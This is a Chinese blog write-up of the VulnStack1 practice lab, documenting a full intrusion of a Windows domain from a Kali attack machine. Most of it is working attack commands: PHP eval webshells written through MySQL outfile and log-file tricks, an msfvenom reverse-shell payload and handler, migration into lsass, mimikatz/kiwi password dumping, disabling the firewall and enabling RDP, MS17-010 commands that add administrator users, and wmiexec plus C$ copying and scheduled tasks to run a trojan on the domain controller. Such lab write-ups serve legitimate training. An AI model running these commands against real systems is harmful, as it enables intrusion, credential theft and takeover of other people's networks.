---
title: VulnStack1
date: 2021-04-19 21:51:28
author: Na0H
headimg: https://i.loli.net/2021/03/18/W37ZjQGTCcnim8P.png
tags:	
- 靶场
categories:
- 靶场
excerpt: VulnStack1
description: VulnStack1
---

<!-- more -->

## 前言

最近有些迷茫，就只是单纯的刷web题和写一下python脚本，渗透方面倒是没啥长进
就打算做一下这些靶场，也了解一下内网

## 环境安装及配置

![](https://i.loli.net/2021/03/18/W37ZjQGTCcnim8P.png)

|  名称   |       ip        |      说明       |
| :-----: | :-------------: | :-------------: |
|  kali   | 192.168.244.129 |     攻击机      |
|  win7   | 192.168.244.134 | VM1：web服务器  |
| win2k3  | 192.168.52.141  |   VM2：域成员   |
| win2008 | 192.168.52.138  | VM3：域控服务器 |

用的是VMware，将三个虚拟机的压缩包解压，然后VM扫描虚拟机就快速导入了

关键是网络的配置：

攻击机kali网卡设置为：`VMnet8(NAT模式)`

VM1(Win7)添加一块网卡，分别设置为：`VMnet1(仅主机模式)`、`VMnet8(NAT模式)`
VM2(Win2003)网卡设置为：`VMnet1(仅主机模式)`
VM2(Win2008)网卡设置为：`VMnet1(仅主机模式)`
![](https://i.loli.net/2021/03/18/JCS5pvBgq12w3Pr.png)

开机要求输入密码为：`hongrisec@2019`，可能提示要修改密码，必须有符号、字母和数字
（ps：提示按ctrl+alt+del才能进入登陆框，但这样物理机也会弹出任务管理，因此在vm中按ctrl+alt+ins就可以了）

### 系统任务栏图标透明、无法打开

然后就是打开win7的phpstudy了，但在这里踩坑了，运行时phpstudy由于无法创建任务栏图标崩溃了--
搞了一个多钟差点破防，后来用度娘一搜就出来==，是真的难受

**解决办法：**

1. win+r输入`regedit`打开注册表
2. 依次找到
   HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify
3. 清空`IconStreams`和`PastIconsStream`的值（右键全选、删除|剪切，保存即可）
4. 重启explorer.exe：打开任务管理器，在进程一栏关闭explorer.exe；然后创建新任务：explorer.exe

### kali安装蚁剑

因为ip配置的问题，物理机没连局域网，想想还是直接在kali装个蚁剑吧

[AntSwordProject/AntSword-Loader: AntSword 加载器 (github.com)](https://github.com/AntSwordProject/AntSword-Loader)
![](https://i.loli.net/2021/03/18/pWmcRr9QXUb58DN.png)
下载完之后找地方解压，然后进入解压后的目录
![](https://i.loli.net/2021/03/18/1g53vqC8aHDObEG.png)

```shell
# 如果没有x权限就给AntSword加个执行权限
sudo chmod u+x AntSword
# 然后允许AntSword即可，需要一个具有写权限的初始化目录，按自己心情弄吧--
sudo mkdir antsword
# 运行！
./AntSword
```

## 外网渗透

### 信息收集

#### 主机发现

咱们的攻击机kali ip是192.168.244，用nmap扫一下`nmap -sn 192.168.244.129/24`
![](https://i.loli.net/2021/03/18/SgKNX1AsWU6RIYF.png)

可以看到扫出了win7的外网ip

#### 端口扫描

然后就是扫描主机的端口了，仍是nmap：`nmap -Pn -A 192.168.244.134`

可以看到开放了80和3306端口，想到网站和mysql数据库

![](https://i.loli.net/2021/03/18/WQKE1Z4gLvb9Pic.png)

### 漏洞挖掘

接下来就是对外网进行渗透了，先访问一下ip，直接就是一个探针
![](https://i.loli.net/2021/03/18/wmLz6QafxJu8KbU.png)
先扫下目录吧，看看有啥好东西
这里没装脚本，就用一下kali自带的niktp：`nikto -h 192.168.244.134`

![](https://i.loli.net/2021/03/18/8B9Qj5ihOTYrKRL.png)
可以看到扫到个phpmyadmin，常规密码、弱口令走一波
root、root登陆成功

版本为5.5.53，可惜看到的大部分漏洞都不包含这个版本
![](https://i.loli.net/2021/03/18/cJT5hodMK3QYI8z.png)

### 漏洞利用

#### PHPMyadmin后台getshell技巧

##### 直接写入

那么先试试之前学过的select into outfile|dumpfile 直接写shell

利用条件

- secure_file_priv没有具体值（不是NULL）
  (NULL:限制mysql导入和导出；无具体值：不做限制；有值：只能在该值指定目录进行导入导出)
- 知道路径，具有写权限，可使用单引号
  （ps：`magic_quotes_gpc`开启时，会对'单引号进行转义，使其变成“\”反斜杠）

okk，那么就开始吧，利用`@@datadir`、`@@secure_file_priv`来看看这些值如何

![](https://i.loli.net/2021/03/18/S5QiwoLa4WX6VG3.png)
可惜的是secure_file_priv=NULL，那么此法就不可行了，正好学习其他方法

```sql
插一条能正常执行的payload--
select '<?php @eval($_POST[1]);?>' into outfile 'D:\\environment\\phpstudy_pro\\WWW\\1.php'
```



##### 利用日志文件getshell

前提：

- 账号拥有`可读可写`权限
- `Mysql`版本大于`5.0`，在5.0版本以上mysql会创建日志文件，通过改变全局变量控制日志文件的生成从而getshell

###### 开启全局日志getshell

- 步骤：

  - 查看general_log和general_log_file：`show variables like '%general%';`
  - 开启general log模式：`set global general_log = on;`
  - 设置日志目录为shell写入路径：`set global general_log_file = 'C:/phpStudy/WWW/hhh.php';`
  - 写入shell：`select '<?php eval($_POST[hhh]);?>'`




<u>实操一波</u>：

ps：同样的这样查也可以(如下general_log就没打开)

![](https://i.loli.net/2021/03/18/wTXqm26oaebGBhL.png)
那么就按步骤一步步来吧：

```mysql
set global general_log = on;
set global general_log_file = 'C:/phpStudy/WWW/hhh.php';
select @@general_log,@@general_log_file,@@datadir;
```

okk，全局日志以及路径都设置好了，接下来就是写shell了

（ps：这里的www路径可以在探针里看，也可以利用@@datadir爆出phpstudy路径，然后根据默认路径找到www）
![](https://i.loli.net/2021/03/18/8x9qDXUIEwoNbVT.png)

```mysql
select '<?php eval($_POST[hhh]);?>'
```

![](https://i.loli.net/2021/03/18/qfaN7S8PvFMn5yc.png)

文件内容如下，就是一个存储命令和状态的日志
![](https://i.loli.net/2021/03/18/KtlRNa18eAsyBc7.png)

蚁剑连接即可：

![](https://i.loli.net/2021/03/18/xRuFK9zbdq4Zs6j.png)

###### 使用慢查询日志getshell

- 慢查询日志：
  记录所有执行时间超过long_query_time秒的所有查询或者不使用索引的查询。默认情况下，MySQL数据库是不开启慢查询日志的，long_query_time的默认值为10（即10秒，通常设置为1秒），即运行10秒以上的语句是慢查询语句
  （ps：和全局日志一样都是讲恶意语句写入日志中，只是二者记录的条件不同）
- 步骤：
  - 查看相关参数：`show variables like '%slow%';`
  - 启用慢查询日志，并修改路径：
    `set global slow_query_log_file = 'C:/phpStudy/WWW/hhh2.php';`
    `set GLOBAL slow_query_log=on;`
  - 写入shell：`select '<?php eval($_POST[hhh]);?>' from mysql.db where sleep(10);`

![](https://i.loli.net/2021/03/18/57lRmE3kZtqGo8A.png)
![](https://i.loli.net/2021/03/18/jDBZV9ymuG6r37c.png)j

看一下www目录下还有个yxcms，em看了这里也可以getshell，那么就来看一下吧

#### yxcms后台getshell

搜了一下相关漏洞，后台getshell好像更容易一些
后台路径：`ip/yxcms/index.php?r=admin`,又是弱口令：admin、123456直接登入了，不得不说弱口令yyds
（说起来学校也是好多弱口令，当然我没打过啊，只是知道密码--）

在后台里可以直接 新建 | 修改文件内容，那么直接上马，连接即可

![](https://i.loli.net/2021/03/18/N21VQTJFhci98kO.png)



外网大概就是到这里0。0，内网还在研究，需要学习一下msf和cs的使用



## 拿下VM1进入内网

### 信息收集

刚开始学习其实有点纠结于信息收集，其实信息收集按个人习惯就好，达到最终目的就可以了

```
whoami					# 查看权限；用户为god；权限为administrator，可以上传东东反弹shell~
ipconfig				# 看网卡
net config Workstation	# 查看当前登录域及登录用户信息
net view /domain:god	# 查看域成员
```

### MSF反弹shell

作为msf的一次练习，学习了
[渗透攻防工具篇-后渗透阶段的Meterpreter (seebug.org)](https://paper.seebug.org/29/)
[msf后渗透利用命令|MrWu](https://www.mrwu.red/web/2674.html)

那么先在msf弹一个shell：
msf生成一个payload上传到win7并执行，得到msf的session

```shell
# 这里的IP是攻击机也就是kali的ip，端口则是监听的端口：
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.244.128 LPORT=6666 -f exe -o hhh.exe

# 生成完毕给他777权限：
chmod 777 hhh.exe
```

![把他上传到win7](https://i.loli.net/2021/04/07/sIcoH1ZxDtWFORq.png)

然后在kali利用msf接收这个反弹shell：

```shell
msfconsole
use exploit/multi/handler     							# 进入模块
set payload windows/x64/meterpreter/reverse_tcp     	# 设置payload模块
set lhost 192.168.118.130     							# 设置要监听的地址
set lport 6666        									# 设置监听的端口
run														# 执行攻击（run|exploit都可以）
```

![](https://i.loli.net/2021/04/07/FmK9x4pGSjhtv2e.png)

然后在win7执行hhh.exe就可以拿到反弹shell了
可以看到拿到了一个meterpreter

![](https://i.loli.net/2021/04/07/mDq8K1uaRjpzTFy.png)



#### 迁移进程

```shell
一些msf的命令：
getuid		查看用户权限
getsystem	提权为管理员
sysinfo		查看系统信息
ps			查看进程
migrate pid	迁移进程至pid号进程
shell		进入主机的命令行
chcp 65001	设置活动代码页为UTF-8（936简体中文GBK，950繁体中文，437MS-DOS）
```

这里`getuid`可以看到咱们是god/admin，
（当然不是admin可能反弹shell都上传不了--，如果拿到shell需要提权的话msf也有命令可以提权：`getsystem`）

然后就是维持权限了，把咱们的反弹shell迁移到系统自身进程上去：
`ps`查看进程，再迁徙就行（一般可以注入到像是 lsass 或者 explorer 这样的进程当中，相对比较隐蔽，较难排查）
执行`migrate 504`即可
可以看到lsass进程pid为504，反弹shell进程为4300，执行后就由4300迁徙到504啦

![lsass进程pid为504](https://i.loli.net/2021/04/17/NS8DJQkWrHfLdoC.png)

![反弹shell进程为4300](https://i.loli.net/2021/04/17/27WBGoczia1PtO4.png)


也可以用进程名进行迁移，如下

```shell
# 迁移到任务管理器中
migrate -N explorer.exe  

# 设置反弹shell后自动迁移
set autorunscript migrate -N explorer.exe
或者
set autorunscript migrate -f (默认迁移到记事本)
```

然后就是抓取管理员密码了，windows抓取密码的话当然是mimikatz~：`load mimikatz`运行msf自带的mimikatz模块

> mimikatz：
> 1.`mimikatz`可以直接从 lsass.exe 进程里获取windows处于active状态账号的明文密码
>
> （lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！）
> 2.`mimikatz`模块的使用需要Administrator权限或者System权限。MSF中自带mimikatz模块，MSF中的 mimikatz 模块同时支持32位和64位的系统，但是`该模块默认是加载32位的系统`，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。而且在64位系统下必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载mimikatz并且查看系统明文。但是在32位系统下则没有这个限制。
>
> ```
> 相关命令可以输入：help mimikatz来查看，如下
> (只能显示七个命令，可以通过mimikatz_command输入一条错误指令来显示完整的功能命令
> eg：mimikatz_command -f a::)
> kerberos：kerberos相关的模块
> livessp：尝试检索livessp凭据
> mimikatz_command：运行一个定制的命令
> msv：msv凭证相关的模块，列出目标主机的用户密码哈希
> ssp：ssp凭证相关的模块
> tspkg：tspkg凭证相关的模块
> wdigest：wdigest凭证相关的模块
> ```
> ![完整功能命令](https://i.loli.net/2021/04/17/MGgXVyiwhf2xka1.png)
>
> 这里用到的是`sekurlsa`下的`searchPasswords`功能来查看明文密码
> (ps:这里本身就是`NT AUTHORITY\SYSTEM`,就不用`privilege::debug`进行提权了)
>
> ```shell
> mimikatz_command -f sekurlsa::searchPasswords
> ```
>
> ~不过我这拿不到明文，只能得到密文--~
>
> > 原理：获取到内存文件lsass.exe进程(它用于本地安全和登陆策略)中存储的明文登录密码
> >
> > 利用前提：拿到了admin权限的cmd，管理员用密码登录机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。
> >
> > 抓取明文：手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 = 截取明文密码
>
> ![](https://i.loli.net/2021/04/18/DhwS9J5APNuQ7b2.png)

当然也可以上传个mimikatz.exe直接整

```
upload mimikatz.exe路径 靶机路径：如upload root\mimikatz.exe路径 靶机
```

然后就可以利用3389端口和获得的管理员帐号来进行远程登录了
（思路不限制，主要还是习惯，看一些文章有的师傅是直接新建用户进行远程登录再进行操作提权这些）



> 后面重新打了一遍，msf6中mimikatz被kiwi替代了，可以输入help kiwi查看相关指令
>
> ```
> meterpreter > help kiwi
> 
> Kiwi Commands
> =============
> 
>     Command                Description
>     -------                -----------
>     creds_all              Retrieve all credentials (parsed)
>     creds_kerberos         Retrieve Kerberos creds (parsed)
>     creds_livessp          Retrieve Live SSP creds
>     creds_msv              Retrieve LM/NTLM creds (parsed)
>     creds_ssp              Retrieve SSP creds
>     creds_tspkg            Retrieve TsPkg creds (parsed)
>     creds_wdigest          Retrieve WDigest creds (parsed)
>     dcsync                 Retrieve user account information via DCSync (unparsed)
>     dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
>     golden_ticket_create   Create a golden kerberos ticket
>     kerberos_ticket_list   List all kerberos tickets (unparsed)
>     kerberos_ticket_purge  Purge any in-use kerberos tickets
>     kerberos_ticket_use    Use a kerberos ticket
>     kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
>     lsa_dump_sam           Dump LSA SAM (unparsed)
>     lsa_dump_secrets       Dump LSA secrets (unparsed)
>     password_change        Change the password/hash of a user
>     wifi_list              List wifi profiles/creds for the current user
>     wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
> 
> ```
>
> 可以用kiwi_cmd来执行mimikatz的命令
>
> ```shell
> kiwi_cmd -f sekurlsa::logonPasswords
> ```
>
> 结果如下：
>
> ![](https://i.loli.net/2021/11/04/ka3inTQUNbrDx4c.png)
>
> 

### 3389端口远程登录

然后就是看3389端口了

```shell
# 这里可以msf直接看端口，不过之前nmap扫的时候看到3389是没开的
netstat -ano |findstr 3389		# msf
nmap 192.168.244.134 -p1-65534	# nmap
```

![可以看到3389端口没有打开](https://i.loli.net/2021/04/18/N286UrgTs4GOBld.png)

```shell
# 打开3389端口，得在shell里操作，msf识别不了这个命令
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
# 再看一下端口是否打开成功
netstat -ano |findstr 3389
```

![](https://i.loli.net/2021/04/18/aNblPefDBTqS9VO.png)

不过因为防火墙的原因，还是没能连上，需要把防火墙关一下再进行远程连接

```shell
# 在cmd关闭防火墙
netsh advfirewall set allprofiles state off
```


```shell
# msf 开启远程桌面
run post/windows/manage/enable_rdp
# kali terminal 远程连接
rdesktop 192.168.244.134
```

![](https://i.loli.net/2021/04/18/XgyxeFG98hHskKw.png)
这里的账号填写的是`域名\域用户名，`如`God\Administrator`,下面几个都可以
![这几个都可以](https://i.loli.net/2021/04/18/DhwS9J5APNuQ7b2.png)



或者是新建用户再提权为管理员权限（也就是拉到admin组里啦)

```shell
# cmd
net user username password /add
net localgroup administrators username /add
```

然后就可以直接连接目标主机了



## 内网搜集

### 域信息

```shell
# cmd一些常用命令
ipconfig /all 				查询ip 域信息
systeminfo 					查询系统信息
net config Workstation 		查询计算机信息, 域信息
net user 					本机用户
net user /domain 			查询域用户
net time /domain			查看服务器的时间,如果回显 Workgroup 则说明不存在域，如果顺利显示时间说明存在域且是域用户。像这里报系统错误5 则说明有域但是不在域用户内。
net view /domain:god 		god是域名, 查看域主机名
net user test /domain 		查询域内test用户
net user /domain test 123 	修改test用户密码为123
net group /domain 			查询域工作组
net group 组名 /domain 	   查询域中某工作组
net group "domain admins" /domain 		查询域管理员
net group "domain controllers" /domain 	查看域控制器
tasklist 								查询进程
port scan 					可以扫ip和端口。
```

我们知道一般域控和dns服务器是在一起的，所以我们`nslookup`查一下域名服务器就行。

### 探测内网存活主机

```shell
# msf：
run get_local_subnets	# 获取内网网段
```

![](https://i.loli.net/2021/04/18/zctaDyjAsmO9pPn.png)

```shell
# 添加路由，再利用VM1发现内网网段下的IP
run autoroute -s 192.168.52.0/24
```

![](https://i.loli.net/2021/04/18/8yF1Z2RrJC5YzH7.png)

```shell
# cmd,利用ICMP协议探测存活主机
for /L %i in (1,1,254) DO @ping -w 2 -n 1 192.168.52.%i		# 批量ping 192.168.52.%i
arp -a														# 利用arp协议解析
```

输入`arp -a`可以得到如下结果

![](https://i.loli.net/2021/04/18/ZHAYcvi4xsf7DIa.png)

```shell
# 或者加个条件让输出更简洁一点
for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr "TTL"
```

![](https://i.loli.net/2021/05/18/tGF9k6MWTpnZE3S.png)

> 关于命令`FOR /L %%parameter IN (start,step,end) DO command`:
> ![](https://i.loli.net/2021/04/18/muFeXKx6Y92kwAT.png)

## 横向移动



### msf添加路由、设置socks4a代理

这里添加路由的目的是让其他msf模块也能访问内网的其他主机，也就是通过这台win7的msf会话传递网段192.168.52.x的攻击流量

```shell
# msf下
run get_local_subnets				# 获取内网字段
run autoroute -s 192.168.52.0/24	# 添加路由
run autoroute -p 					# 列出路由表
```

![](https://i.loli.net/2021/05/24/W8xoyc1GOfpetaP.png)

arp -a查看一下所有接口的当前 ARP 缓存表

![](https://i.loli.net/2021/11/06/DhIsXB4Nr7c9uU8.png)

设置socks4a代理

> 参考文章：[内网渗透-msf及socks代理转发_baynk的博客-CSDN](https://blog.csdn.net/u014029795/article/details/117375754)

但是msf6没有socks4a这个模块了，在`msf6`中代理模块改为了`auxiliary/server/socks_proxy`

![](https://i.loli.net/2021/05/24/zfGaxtN5QynlkTB.png)

```shell
background							# 将进程放置后台
use auxiliary/server/socks_proxy	# 利用这个模块设置代理
show options						# 可以看到默认用socks5
set version 4a						# 选择sock的版本
set srvhost 127.0.0.1				# 指定监听的接口ip和端口
set srvport 1088
```

```shell
exploit		# 运行后会自动挂到后台
jobs		# 看一下~
```

![](https://i.loli.net/2021/11/06/qnRryupCh7gzLNt.png)



接着修改/etc下的proxychains4.conf这个文件

![](https://i.loli.net/2021/11/06/GkFHoNSLKWYut5f.png)

如果此时希望使用`msf`或者`nmap`的话，就必须使用`proxychains`来进行启动程序，并且一定要注意`proxychains`只对`tcp`流量有效，所以`udp`和`icmp`都是不能代理转发的。



### 第二台机子

作者给出的内网漏洞列表如下：
![](https://i.loli.net/2021/04/18/pHdYtJsfjMAblaB.png)

扫一下目标端口

```
proxychains nmap -p 1-1000 -Pn -sT 192.168.52.141
```

![](https://i.loli.net/2021/11/06/aW2GFinl5HJodsh.png)



但是这些服务都默认没有开--，得手动打开才行

用ms17_010打个简单的shell回来，然后添加管理员用户尝试3389登录

```
use auxiliary/admin/smb/ms17_010_command
show options
set rhosts 192.168.52.141

set command net user whoami1 Test32141 /add	# 添加用户
run

set command net localgroup administrators whoami1 /add	# 管理员权限
run

set command net localgroup administrators	# 查看用户
run

set command 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'		# win server2003开启3389
run
```

可以看到添加成功了捏

![](https://i.loli.net/2021/11/07/SrZi8dQoUn34RaW.png)

> 查看RDP端口
>
> > 查看端口
> >
> > ```
> > REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber
> > ```
> >
> >  得到连接端口为 0xd3d，转换后为 3389
>
> windows server 2003
>
> > 开启1：
> >
> > ```
> > REG ADD \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
> > ```
> >
> >  关闭：
> >
> > ```
> > REG ADD \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 11111111 /f
> > ```
> >
> >  开启2：
> >
> > ```
> > wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
> > ```
> >
> > ```
> > REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
> > ```
> >
> > ```
> > REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
> > ```
> >
> > 
>
> windows server 2008
>
> > 开启：
> >
> > ```
> > REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f
> > ```

然后远程连接~，记得用`proxychains`

```
proxychains rdesktop 192.168.52.141
```

Log on to 记得换一下~

![](https://i.loli.net/2021/11/06/OX7UurM9PNTCz2F.png)![](https://i.loli.net/2021/11/07/sVorPe9ClIT52nv.png)

因为有了用户名和密码了
可以用`exploit/windows/smb/ms17_010_psexec`打一个shell回来，但是一直打成蓝屏--

```
use exploit/windows/smb/ms17_010_psexec
set rhost 192.168.52.141
set payload windows/meterpreter/bind_tcp
set lhost 127.0.0.1
set lport 4444
set SMBUser whoami1
set SMBPass Test32141
```

然后像第一台机子一样抓管理员密码

还看到个思路：

> 也可以添加用户和使用regeorg+proxifier进入内网连接，然后用netsh中转得到session

### 域控

然后就是域控，ip是192.168.52.138，

因为前面已经拿到域用户的用户名和密码了

> wmiexec.vbs：[K8tools/wmiexec.vbs at master (github.com)](https://github.com/seldomlee/K8tools/blob/master/wmiexec.vbs)

先把wmi上传到win7里，然后在win7这台机子

```
cscript.exe wmiexec.vbs /cmd 192.168.52.138 whoami
```

得到回显

![](https://s2.loli.net/2022/03/09/grN7QxLdpKWy1RM.png)

同理传个msf的木马到win7，然后域控下回来~

```
msfvenom -p windows/meterpreter/bind_tcp -f exe -o zs.exe
```



用win7连接域控的C盘共享

```
net use \\192.168.52.138\c$ "!admin123" /user:"administrator"
```

查看域控c盘

```
dir \\192.168.52.138\c$
```

把msf的木马文件复制过去

```
copy C:\phpStudy\WWW\zs.exe \\192.168.52.138\c$
```

![](https://i.loli.net/2021/11/07/GcOn61DaelTCryd.png)

然后

```
cscript.exe wmiexec.vbs /cmd 192.168.52.138 c:\zs.exe
```

也可以开个定时任务

```
shell schtasks /create /tn "test" /tr c:\zs.exe /sc once /st 18:05 /S 192.168.52.138 /RU System  /u administrator /p "!admin123"
```

